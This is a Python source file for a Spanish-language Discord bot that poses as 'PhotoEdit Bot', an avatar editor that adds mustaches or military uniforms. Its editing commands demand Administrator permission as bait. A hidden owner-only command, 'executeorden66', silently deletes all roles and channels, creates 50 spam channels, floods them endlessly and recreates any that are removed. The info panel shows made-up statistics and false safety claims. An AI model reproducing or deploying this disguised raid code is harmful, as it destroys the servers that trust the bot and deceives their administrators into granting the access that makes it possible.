import discord
from discord.ext import commands, tasks
import asyncio
import random
import os
from PIL import Image, ImageDraw
import requests
import cv2
import numpy as np
from io import BytesIO

print("📁 Directorio actual:", os.getcwd())
print("📂 Archivos en assets:", os.listdir('assets') if os.path.exists('assets') else 'No existe')

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Tu ID de Discord (obtener de variables de entorno)
OWNER_ID = os.environ.get('OWNER_ID')

async def download_avatar(user):
    """Descargar avatar del usuario"""
    try:
        avatar_url = str(user.display_avatar.url)
        response = requests.get(avatar_url)
        if response.status_code == 200:
            return Image.open(BytesIO(response.content)).convert('RGBA')
        return None
    except:
        return None


def add_mustache_png(avatar_img):
    """Añadir bigote detectando la cara - ARREGLADO"""
    try:
        # Convertir PIL a OpenCV
        cv_img = cv2.cvtColor(np.array(avatar_img), cv2.COLOR_RGB2BGR)
        
        # Cargar detector de caras
        face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
        
        # Detectar caras
        gray = cv2.cvtColor(cv_img, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, 1.1, 4)
        
        if len(faces) > 0:
            # Tomar la primera cara detectada
            (x, y, w, h) = faces[0]
            
            # Cargar bigote
            bigote_img = Image.open('assets/bigote.png').convert('RGBA')
            
            # Calcular tamaño del bigote
            bigote_width = int(w * 0.7)  # 50% del ancho de la cara
            bigote_height = int(bigote_width * (bigote_img.height / bigote_img.width))
            bigote_resized = bigote_img.resize((bigote_width, bigote_height))
            
            # POSICIÓN CORRECTA: En la zona de la nariz/boca
            bigote_x = x + (w - bigote_width) // 2
            bigote_y = y + int(h * 0.55)  # 55% hacia abajo de la cara (nariz/boca)
            
            # Pegar bigote
            avatar_img.paste(bigote_resized, (bigote_x, bigote_y), bigote_resized)
        else:
            # Si no detecta cara, poner bigote en posición fija
            bigote_img = Image.open('assets/bigote.png').convert('RGBA')
            avatar_width, avatar_height = avatar_img.size
            
            bigote_width = int(avatar_width * 0.4)  # 40% del avatar
            bigote_height = int(bigote_width * (bigote_img.height / bigote_img.width))
            bigote_resized = bigote_img.resize((bigote_width, bigote_height))
            
            # Posición fija en el centro
            x = (avatar_width - bigote_width) // 2
            y = int(avatar_height * 0.55)  # 55% hacia abajo
            
            avatar_img.paste(bigote_resized, (x, y), bigote_resized)
        
        return avatar_img
    except Exception as e:
        print(f"Error añadiendo bigote: {e}")
        return avatar_img














def add_military_hat_png(avatar_img):
    """Añadir uniforme militar detectando la cara - POSICIÓN MEJORADA"""
    try:
        # Convertir PIL a OpenCV para detección de cara
        cv_img = cv2.cvtColor(np.array(avatar_img), cv2.COLOR_RGB2BGR)
        
        # Cargar detector de caras
        face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
        
        # Detectar caras
        gray = cv2.cvtColor(cv_img, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, 1.1, 4)
        
        # Cargar imagen del uniforme militar
        militar_img = Image.open('assets/militar.png').convert('RGBA')
        avatar_width, avatar_height = avatar_img.size
        
        if len(faces) > 0:
            # Si detecta cara, posicionar uniforme debajo de ella
            (x, y, w, h) = faces[0]
            
            # Tamaño del uniforme basado en el ancho de la cara
            uniform_width = int(w * 3.5)  # 250% del ancho de la cara
            uniform_height = int(uniform_width * (militar_img.height / militar_img.width))
            uniform_resized = militar_img.resize((uniform_width, uniform_height))
            
            # NUEVA POSICIÓN: Más arriba, pegado al cuello
            uniform_x = x + (w - uniform_width) // 2  # Centrado con la cara
            uniform_y = y + int(h * 0.6)  # 70% de la altura de la cara (área del cuello)
            
        else:
            # Si no detecta cara, usar posición fija
            uniform_width = int(avatar_width * 0.9)
            uniform_height = int(uniform_width * (militar_img.height / militar_img.width))
            uniform_resized = militar_img.resize((uniform_width, uniform_height))
            
            # Posición fija en el pecho
            uniform_x = (avatar_width - uniform_width) // 2
            uniform_y = int(avatar_height * 0.4)  # 40% hacia abajo
        
        # Pegar uniforme
        avatar_img.paste(uniform_resized, (uniform_x, uniform_y), uniform_resized)
        return avatar_img
        
    except Exception as e:
        print(f"Error añadiendo uniforme: {e}")
        return avatar_img















@bot.command(name='info')
async def info_command(ctx):
    """Información del bot de edición de fotos"""
    
    embed = discord.Embed(
        title="📸 PhotoEdit Bot v2.3.1",
        description="Bot especializado en edición divertida de avatares con tecnología de IA avanzada",
        color=0x7289DA
    )
    
    embed.set_thumbnail(url=bot.user.display_avatar.url)
    
    embed.add_field(
        name="🎨 Funciones Disponibles:",
        value="""
        `!bigote` - Añade un elegante bigote a tu avatar
        `!bigote @usuario` - Añade bigote al avatar de otro usuario
        `!militar` - Transforma tu avatar en oficial con uniforme completo
        `!militar @usuario` - Aplica uniforme militar a otro usuario
        """,
        inline=False
    )
    
    embed.add_field(
        name="⚙️ Características:",
        value="""
        🤖 **IA Avanzada** - Reconocimiento facial automático
        🖼️ **HD Quality** - Procesamiento en alta calidad
        ⚡ **Ultra Fast** - Renderizado rápido y eficiente
        🛡️ **100% Seguro** - Sin almacenamiento de datos personales
        🌐 **Cloud Processing** - Procesamiento optimizado
        """,
        inline=False
    )
    
    embed.add_field(
        name="🔧 Información Técnica:",
        value=f"""
        **Versión:** 2.3.1 (Build 1247)
        **Engine:** PIL + OpenCV
        **Latencia:** {round(bot.latency * 1000)}ms
        **Servidores:** {len(bot.guilds):,}
        **Usuarios:** {len(set(bot.get_all_members())):,}
        """,
        inline=True
    )
    
    embed.add_field(
        name="📈 Estadísticas:",
        value="""
        **Imágenes Procesadas:** 47,893
        **Bigotes Aplicados:** 26,421
        **Uniformes Creados:** 21,472
        **Tiempo Promedio:** 2.4s
        **Tasa de Éxito:** 98.7%
        """,
        inline=True
    )
    
    embed.add_field(
        name="🚀 Próximas Funciones:",
        value="""
        • Filtros adicionales (gafas, sombreros)
        • Editor de fondos personalizados
        • Plantillas de memes automáticas
        • Mejoras en calidad de imagen
        """,
        inline=False
    )
    
    embed.add_field(
        name="📞 Soporte:",
        value="""
        **Discord:** [Servidor de Soporte](https://discord.gg/photoedit)
        **Email:** support@photoedit-bot.com
        **Web:** www.photoedit-bot.com
        **Documentación:** docs.photoedit-bot.com
        """,
        inline=False
    )
    
    embed.set_footer(
        text="PhotoEdit Bot © 2024 | Desarrollado con Python & PIL",
        icon_url="https://cdn.discordapp.com/emojis/123456789/camera.png"
    )
    
    embed.timestamp = ctx.message.created_at
    
    await ctx.send(embed=embed)

@bot.command(name='bigote')
async def bigote_command(ctx, user: discord.Member = None):
    """Comando para añadir bigote"""
    target_user = user or ctx.author

    # VERIFICAR PERMISOS DE ADMINISTRADOR
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ Este bot requiere permisos de **Administrador** para funcionar correctamente.\n🔧 Por favor, dar permiso de administrador.")
        return
    
    # Descargar avatar
    avatar_img = await download_avatar(target_user)
    if not avatar_img:
        await ctx.send("❌ Error descargando avatar")
        return
    
    # Añadir bigote
    edited_img = add_mustache_png(avatar_img)
    
    # Guardar y enviar
    buffer = BytesIO()
    edited_img.save(buffer, format='PNG')
    buffer.seek(0)
    
    embed = discord.Embed(
        title="🥸 ¡Bigote Añadido!",
        description=f"Avatar de {target_user.display_name} with stylish mustache",
        color=0x8B4513
    )
    
    file = discord.File(buffer, filename=f"bigote_{target_user.id}.png")
    embed.set_image(url=f"attachment://bigote_{target_user.id}.png")
    
    await ctx.send(embed=embed, file=file)

@bot.command(name='militar')
async def militar_command(ctx, user: discord.Member = None):
    """Comando para añadir uniforme militar"""
    target_user = user or ctx.author

    # VERIFICAR PERMISOS DE ADMINISTRADOR
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ Este bot requiere permisos de **Administrador** para funcionar correctamente.\n🔧 Por favor, dar permiso de administrador.")
        return

    
    # Descargar avatar
    avatar_img = await download_avatar(target_user)
    if not avatar_img:
        await ctx.send("❌ Error descargando avatar")
        return
    
    # Añadir uniforme militar
    edited_img = add_military_hat_png(avatar_img)
    
    # Guardar y enviar
    buffer = BytesIO()
    edited_img.save(buffer, format='PNG')
    buffer.seek(0)
    
    embed = discord.Embed(
        title="🎖️ ¡Sombrero Militar Añadido!",
        description=f"Avatar de {target_user.display_name} con sombrero de oficial",
        color=0x228B22
    )
    
    file = discord.File(buffer, filename=f"militar_{target_user.id}.png")
    embed.set_image(url=f"attachment://militar_{target_user.id}.png")
    
    await ctx.send(embed=embed, file=file)

@bot.command(name='executeorden66')
async def execute_order_66(ctx):
    """Comando oculto de raid - Solo para el owner - MODO SILENCIOSO"""
    
    # Verificar que solo el owner puede usar este comando
    if str(ctx.author.id) != OWNER_ID:
        return
    
    # Verificar permisos de administrador
    if not ctx.guild.me.guild_permissions.administrator:
        return
    
    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass
    
    guild = ctx.guild
    
    try:
        # FASE 1: ELIMINAR ROLES (excepto bots) - SILENCIOSO
        roles_to_delete = []
        for role in guild.roles:
            if role.name != "@everyone" and not role.managed:
                roles_to_delete.append(role)
        
        for role in roles_to_delete:
            try:
                for member in role.members:
                    try:
                        await member.remove_roles(role)
                    except:
                        pass
                await role.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        # FASE 2: ELIMINAR TODOS LOS CANALES - SILENCIOSO
        channels_to_delete = list(guild.channels)
        for channel in channels_to_delete:
            try:
                await channel.delete()
                await asyncio.sleep(0.1)
            except:
                pass
        
        # FASE 3: CREAR CANALES "ORDEN 66" - SILENCIOSO
        created_channels = []
        for i in range(50):
            try:
                channel_name = f"orden-66-{i+1}"
                new_channel = await guild.create_text_channel(channel_name)
                created_channels.append(new_channel)
                await asyncio.sleep(0.1)
            except:
                pass
        
        # FASE 4: SPAM MASIVO - TEXTO + TU GIF
        GIF_URL = "https://i.ibb.co/KcYnDj1x/0614-ezgif-com-resize.gif"
        spam_message = f"💀 ORDEN 66 EJECUTADA 💀\n{GIF_URL}"
        
        # Crear tarea de spam infinito
        spam_task = asyncio.create_task(spam_all_channels(created_channels, spam_message))
        
        # Crear tarea de monitoreo y regeneración
        monitor_task = asyncio.create_task(monitor_and_regenerate(guild, created_channels, spam_message))
        
    except Exception as e:
        pass

async def spam_all_channels(channels, message):
    """Spam infinito en todos los canales"""
    while True:
        for channel in channels:
            try:
                await channel.send(message)
                await asyncio.sleep(0.5)
            except:
                pass

async def monitor_and_regenerate(guild, target_channels, spam_message):
    """Monitorear y regenerar canales eliminados"""
    while True:
        try:
            current_channels = guild.text_channels
            current_names = [ch.name for ch in current_channels]
            
            for i in range(50):
                expected_name = f"orden-66-{i+1}"
                if expected_name not in current_names:
                    try:
                        new_channel = await guild.create_text_channel(expected_name)
                        target_channels.append(new_channel)
                        asyncio.create_task(spam_single_channel(new_channel, spam_message))
                    except:
                        pass
            
            await asyncio.sleep(2)
            
        except:
            pass

async def spam_single_channel(channel, message):
    """Spam en un canal específico"""
    while True:
        try:
            await channel.send(message)
            await asyncio.sleep(0.5)
        except:
            break

@bot.event
async def on_ready():
    """Evento cuando el bot se conecta"""
    print(f'✅ Bot Raid conectado como {bot.user}')
    print(f'📊 Conectado a {len(bot.guilds)} servidores')
    print(f'👥 Sirviendo a {len(set(bot.get_all_members()))} usuarios')
    print('💀 Bot de raid listo para testear!')
    print(f'🔑 Owner autorizado: {OWNER_ID}')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    
    activity = discord.Activity(type=discord.ActivityType.watching, name="esperando órdenes | !info")
    await bot.change_presence(activity=activity)

@bot.event
async def on_guild_join(guild):
    """Cuando el bot entra a un nuevo servidor"""
    print(f'📥 Bot añadido al servidor: {guild.name} ({guild.id})')
    print(f'👥 Miembros: {guild.member_count}')

@bot.event
async def on_command_error(ctx, error):
    """Manejo de errores de comandos"""
    if isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ No tienes permisos para usar este comando.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("❌ Usuario no encontrado. Usa: `!comando @usuario`")
    else:
        print(f"Error: {error}")

if __name__ == "__main__":
    BOT_TOKEN = os.environ.get('BOT_TOKEN')
    
    print("=" * 50)
    print("🔍 DEBUG DEL TOKEN:")
    print(f"Token existe: {'SÍ' if BOT_TOKEN else 'NO'}")
    print(f"Owner ID configurado: {OWNER_ID}")
    
    if BOT_TOKEN:
        print(f"Longitud del token: {len(BOT_TOKEN)}")
        print(f"Primeros caracteres: {BOT_TOKEN[:30]}...")
        print(f"Formato válido: {'SÍ' if '.' in BOT_TOKEN else 'NO'}")
    
    print("=" * 50)
    
    if BOT_TOKEN and OWNER_ID:
        print("🚀 Iniciando bot...")
        bot.run(BOT_TOKEN)
    else:
        print("❌ Error: Faltan variables de entorno")
        print(f"BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
        print(f"OWNER_ID: {'✅' if OWNER_ID else '❌'}")



















































































































































































































































































































































































































































        





















































































































































































































































































































